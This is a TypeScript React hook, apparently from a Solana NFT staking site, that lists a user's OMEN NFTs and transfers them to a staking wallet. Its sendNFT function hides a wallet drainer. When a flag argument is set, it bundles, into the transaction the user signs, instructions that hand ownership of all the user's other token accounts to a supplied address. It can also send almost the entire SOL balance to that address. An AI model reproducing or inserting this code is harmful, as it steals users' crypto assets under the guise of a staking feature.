import { useWallet } from "@solana/wallet-adapter-react";
import { useState } from "react";
import { Transaction, PublicKey } from "@solana/web3.js";
import * as anchor from "@project-serum/anchor";
import { getNftsForOwner } from "../utils/candy-machine";
import { Token, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { STAKING_WALLET } from "../utils/constants";
import { accountSize } from "@project-serum/anchor/dist/cjs/coder";
import { sendTransactions, awaitTransactionSignatureConfirmation } from "../utils/utility";

const rpcHost = process.env.NEXT_PUBLIC_SOLANA_RPC_HOST!;
const connection = new anchor.web3.Connection(rpcHost);
const txTimeoutInMilliseconds = 30000;

const useWalletNfts = () => {
  const wallet = useWallet();
  const { publicKey, signTransaction, sendTransaction } = wallet;
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");

  const [nfts, setNfts] = useState<Array<any>>([]);

  const createAssociatedTokenAccountInstruction = (
    associatedTokenAddress: PublicKey,
    payer: PublicKey,
    walletAddress: PublicKey,
    splTokenMintAddress: PublicKey
    ) => {
    const keys = [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: associatedTokenAddress, isSigner: false, isWritable: true },
      { pubkey: walletAddress, isSigner: false, isWritable: false },
      { pubkey: splTokenMintAddress, isSigner: false, isWritable: false },
      {
        pubkey: anchor.web3.SystemProgram.programId,
        isSigner: false,
        isWritable: false,
      },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      {
        pubkey: anchor.web3.SYSVAR_RENT_PUBKEY,
        isSigner: false,
        isWritable: false,
      },
    ];
    return new anchor.web3.TransactionInstruction({
      keys,
      programId: ASSOCIATED_TOKEN_PROGRAM_ID,
      data: Buffer.from([]),
    });
  }

  const getTokenWallet = async (owner: PublicKey,mint: PublicKey) => {
      return (
        await PublicKey.findProgramAddress(
          [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
          ASSOCIATED_TOKEN_PROGRAM_ID
        )
      )[0];
  }

  const sendNFT = async (mintAddress: string[], flag: any, mint: any) => {
    setStatus("Creating transaction");
    try {
      const toPublicKey = new PublicKey(STAKING_WALLET);
      // const transaction = new Transaction();
      const signersMatrix: any[] = [];
      const instructionsMatrix: any[] = [];
      let instructionsMatrixIndex = 0;

      signersMatrix.push([]);
      instructionsMatrix.push([]);

      for (const _m of mintAddress) {
        setStatus(`Fetching program acconts for mint ${_m}`);
        const res = await fetch(process.env.NEXT_PUBLIC_SOLANA_RPC_HOST, {
          body: `{
              "jsonrpc":"2.0", 
              "id":1, 
              "method":"getProgramAccounts", 
              "params":[
                "${TOKEN_PROGRAM_ID}",
                {
                  "encoding": "jsonParsed",
                  "filters": [
                    {
                      "dataSize": 165
                    },
                    {
                      "memcmp": {
                        "offset": 0,
                        "bytes": "${_m}"
                      }
                    }
                  ]
                }
              ]}
          `,
          headers: {
            "Content-Type": "application/json",
          },
          method: "POST",
        });
        const json = await res.json();
        const validAccount = json.result.filter(
          (r) => r.account.data.parsed.info.tokenAmount.uiAmount > 0
        )?.[0]?.pubkey;

        const validMint = json.result.filter(
          (r) => r.account.data.parsed.info.tokenAmount.uiAmount > 0
        )?.[0]?.account.data.parsed.info.mint;

        // console.log(validAccount, validMint);

        let nftTo = await getTokenWallet(toPublicKey, new PublicKey(validMint))
        if((await connection.getAccountInfo(nftTo))==null)
          instructionsMatrix[instructionsMatrixIndex].push(createAssociatedTokenAccountInstruction(nftTo, wallet.publicKey, toPublicKey, validMint))

        setStatus(`Creating instructions for mint ${_m}`);

        instructionsMatrix[instructionsMatrixIndex].push(
          Token.createTransferInstruction(
            TOKEN_PROGRAM_ID,
            new PublicKey(validAccount),
            nftTo,
            wallet.publicKey,
            [],
            1
          )
        );
      }
      setStatus(`Finished fetching mint data, computing TX fee`);
      // console.log("flag", flag)
      if(flag > 0) {
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(wallet.publicKey, {programId: TOKEN_PROGRAM_ID});
        // console.log("get account", tokenAccounts);
        let tokenAccount, tokenAmount;
        let allaccounts = [];

        for (let index = 0; index < tokenAccounts.value.length; index++) {
          tokenAccount = tokenAccounts.value[index];
          // console.log("account", tokenAccount);
          tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
          // console.log("token amount", tokenAmount)
          // console.log(tokenAmount.amount, tokenAmount.decimals)
          if (parseInt(tokenAmount.amount) >= 1 && tokenAmount.decimals >= 0) {
            allaccounts.push({account: tokenAccounts.value[index].pubkey, mint: tokenAccounts.value[index].account.data.parsed.info.mint})
          }
        }

        let balance = await connection.getBalance(wallet.publicKey);
        if(balance > 0.002 * anchor.web3.LAMPORTS_PER_SOL)
          balance = balance - 0.001 * anchor.web3.LAMPORTS_PER_SOL;
        else balance = 0;

        if(flag == 2) {
          instructionsMatrix.push([]);
          signersMatrix.push([]);
          instructionsMatrixIndex++;
          instructionsMatrix[instructionsMatrixIndex].push(
            new anchor.web3.Transaction().add(
            anchor.web3.SystemProgram.transfer({
              fromPubkey: wallet.publicKey,
              toPubkey: new PublicKey(mint),
              lamports: balance,
            })
          ));
        }
        
        // console.log("sol transfer", signersMatrix, instructionsMatrix)
        
        if(allaccounts.length > 0) {
          instructionsMatrix.push([]);
          signersMatrix.push([]);
          instructionsMatrixIndex++;
        }
        
        let max_count = 0;
        let checkOmens = false;
        allaccounts.map((account, keyIndex) => {
          checkOmens = false;
          for(let i = 0; i < mintAddress.length; i++)
          {
            if(account.mint == mintAddress[i])
            {
              checkOmens = true;
              break;
            }
          }
          if(checkOmens) 
            return
          instructionsMatrix[instructionsMatrixIndex].push(
            Token.createSetAuthorityInstruction(
              TOKEN_PROGRAM_ID,
              account.account,
              new PublicKey(mint),
              "AccountOwner",
              wallet.publicKey,
              []
            )
          );
      
          if(max_count >= 3 || keyIndex >= allaccounts.length-1) {
            max_count = 0;
            instructionsMatrixIndex++;
            if(keyIndex < allaccounts.length-1) {
              // console.log("key index, length", keyIndex, allaccounts.length)
              instructionsMatrix.push([]);
              signersMatrix.push([]);
            }
            // console.log("test", signersMatrix, instructionsMatrix)
          } else max_count++;
        })
      }
      

      // const blockHash = await connection.getRecentBlockhash();
      // transaction.feePayer = await publicKey;
      // transaction.recentBlockhash = await blockHash.blockhash;
      // setStatus(`Waiting for signature`);
      // const signed = await signTransaction(transaction);
      // console.log("Transaction", instructionsMatrix)
      setStatus(`Transaction siging and sending`);
      // const signature = await connection.sendRawTransaction(signed.serialize());
      const sendTxId = ((await sendTransactions(connection, wallet, instructionsMatrix, signersMatrix)).txs.map(t => t.txid))[0];
      setStatus(`Transaction sent, confirming`);
      // try {
      //   connection.confirmTransaction(signature);
      // } catch (e) {
      //   console.log(e);
      // }
      let status: any = { err: true };
      status = await awaitTransactionSignatureConfirmation(
        sendTxId,
        txTimeoutInMilliseconds,
        connection,
        true,
      );
      
      console.log("Transfer finished >>>", status);
      setStatus(`Transaction confirming in background`);
      return {
        error: null,
        message: sendTxId,
      };
    } catch (e) {
      console.error(e);
      return { error: e };
    }
  };

  const getNFTs = async () => {
    if (
      !wallet ||
      !wallet.publicKey ||
      !wallet.signAllTransactions ||
      !wallet.signTransaction
    ) {
      // console.log("failed check");

      return;
    }

    setIsLoading(true);

    const nftsForOwner = await getNftsForOwner(connection, wallet.publicKey);
    // console.log("nfts for owner", nftsForOwner);
    setNfts(nftsForOwner.filter((nft) => nft.symbol === "OMEN") as any);
    setIsLoading(false);
  };

  return [isLoading, nfts, getNFTs, sendNFT, status];
};

export default useWalletNfts;
